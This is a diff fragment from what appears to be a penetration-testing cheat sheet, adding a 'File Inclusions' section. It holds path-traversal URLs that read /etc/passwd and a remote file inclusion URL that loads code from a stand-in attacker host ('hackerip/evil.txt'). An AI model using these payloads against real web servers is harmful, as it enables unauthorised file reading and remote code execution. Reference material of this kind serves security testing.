@@ -3,6 +3,13 @@
 To attempt to view the /etc/passwd file </b>
 `http://host/index.php?page=./../../../../../etc/passwd%00`
 
+### File Inclusions
+```
+# To check for LFI
+http://target.com/?page=./../../../../../../../../../etc/passwd%00
+
+# To check for RFI
+http://target.com/?page=http://hackerip/evil.txt%00
 ---
 ### Obtaining Shell through Browser Bar (PHP)
 ```
